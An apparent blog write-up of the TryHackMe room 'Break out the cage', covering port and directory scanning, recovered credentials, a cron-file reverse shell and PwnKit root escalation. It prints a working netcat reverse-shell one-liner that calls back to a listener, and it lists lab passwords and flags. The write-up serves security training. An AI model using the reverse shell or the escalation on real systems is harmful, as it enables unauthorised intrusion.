---
layout: post
title: "TryHackMe: Break out the cage"
date: 2025-09-20 23:00:00 +0530
categories: [TryHackMe]
tags: [tryhackme, walkthrough, web-enumeration, privilege-escalation, suid, hash-cracking, post-exploitation, pentesting]
render_with_liquid: false
media_subpath: /images/Break_out_the_cage/
description: "Compact walkthrough of Break out the cage — enumeration, SQL injection, shelling, local enumeration, and SUID binary exploitation."
---

# TryHackMe: Break out the cage — Writeup | 20 September 2025

<div align="center">
  <img src="THM.png" alt="TryHackMe Logo" width="800"/>
  <img src="Break_out.png" alt="Room Banner" width="500"/>
</div>

**Author:** Aakash Modi
---

## Overview
A compact, hands‑on room focused on web‑facing attack paths and local escalation. The exercise guides you through surface enumeration (HTTP, directories, and services), discovering and exploiting an SQL injection to gain initial access, performing targeted local enumeration to find weak points, and abusing a SUID helper to escalate to root. 

Skills practiced:
- Web enumeration and content discovery
- Basic SQL injection exploitation and credential recovery
- Post‑exploitation: shell stabilization and local discovery
- Privilege escalation using misconfigured SUID binaries

Estimated difficulty: Beginner to Intermediate. Perform all activities only in authorized labs and learning environments; do not attempt against systems you do not own or have explicit permission to test.

---

## Website view

- Observed a name on the web page that suggested a username:

  - username: `weston`

- Images referenced in this writeup:
  - `website_view.png`
  - `username.png`

---

## Reconnaissance & Scanning

### Nmap

Run a full port and service scan:

```bash
sudo nmap -Pn -T4 -n -sC -sV -p- -oN scan_cage.txt 10.201.119.193
```

Summary (truncated):
- 21/tcp open  ftp     vsftpd 3.0.3 (anonymous FTP allowed)
- 22/tcp open  ssh     OpenSSH 7.6p1
- 80/tcp open  http    Apache 2.4.29

(Full output saved to `scan_cage.txt`.)

---

## FTP

Anonymous FTP was permitted. Example credentials used:

- username: `anonymous`
- password: `anonymous`

From the FTP server we downloaded `dad_tasks`. (See `ftp_login.png`, `get_file.png`, `tasks_file.png`.)

---

## Web enumeration (gobuster)

Directory scan example:

```bash
gobuster dir -u http://10.201.38.13/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
  -o dir_results.txt -t 25
```

Interesting directories found:
- `/images/`
- `/html/`
- `/scripts/`
- `/contracts/`
- `/auditions/`

---

## Vigenère / encoded data

A base64 string discovered in the lab contained a Vigenère-encrypted message. Using CyberChef and a Vigenère solver we recovered credentials:

- username: `weston`
- password: `Mydadisghostrideraintthatcoolnocausehesonfirejokes`

(See `hash_creak.png`, `hash_to_plain_text.png`, `password.png`.)

---

## Access & Local Enumeration

Logged in as `weston` via SSH. Local enumeration highlights:

- `sudo -l` output showed `weston` can run one program as root:

```
User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees
```

Running `/usr/bin/bees` printed a broadcast message (“AHHHHHHH THEEEEE BEEEEESSSS!!!”), suggesting a cron-driven process or periodic script.

To inspect scheduled activity, I used `pspy` on the box (copied to the target and made executable). `pspy` showed a cron-invoked Python script:

- `/opt/.dads_scripts/spread_the_quotes.py` (run regularly)

Listing `/opt/.dads_scripts` revealed a `.files` directory containing `.quotes`. The `.quotes` file is read by the periodic script.

Files of interest:
- `/opt/.dads_scripts/spread_the_quotes.py`
- `/opt/.dads_scripts/.files/.quotes`

(See `pspy.png`, `automated_script.png`, `interesting.png`.)

---

## Privilege escalation via writable file

Because the cron-run script read `.quotes`, I was able to plant a payload into `/opt/.dads_scripts/.files/.quotes`. Example reverse shell entry used for this lab (replace IP/port with your listener when in a lab):

```bash
echo "hacked; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.76.195 8888 >/tmp/f" > /opt/.dads_scripts/.files/.quotes
```

After gaining an interactive shell, make it stable:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Inside the box, enumeration revealed `Super_Duper_Checklist` containing Task 2 token:

- flag (Task 2): THM{M37AL_0R_P3N_T35T1NG}

(See `payload.png`, `flag_tash2.png`.)

---

## Root privilege escalation

I searched for SUID binaries and other potential escalation vectors:

```bash
find / -type f -perm -4000 2>/dev/null
```

`/usr/bin/pkexec` (Polkit pwnkit) was present. I used a publicly available PwnKit exploit to escalate to root (downloaded to my machine, hosted via a simple HTTP server, fetched on target with `wget`, and executed). After successful exploitation I obtained a root shell.

Root flag was in `email_backup/email_2`:

- root flag: THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}

(See `pwnkit.png`, `python_server.png`, `download_pwnkit.png`, `root_access.png`, `root_flag.png`.)

---

## Summary

- Performed network and web enumeration (nmap, gobuster).
- Found credentials via FTP and encoded payloads.
- Gained a shell by leveraging a periodically executed script that read a writable file.
- Completed local privilege escalation via an available SUID/Polkit vector to obtain root.
- Collected user and root flags.

---

## Room Complete!

<div align="center">
  <img src="completed.png" alt="Completed" width="800"/>
</div>

---

## Happy Hacking!

<div align="center">
  <img src="https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExeDB3ODg0am45c252cXZiOXhldXZ1aDgzMjYxdXJuaWhkbjh1dzI4ZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/rMS1sUPhv95f2/giphy.gif" alt="Hacking GIF" width="800"/>
</div>
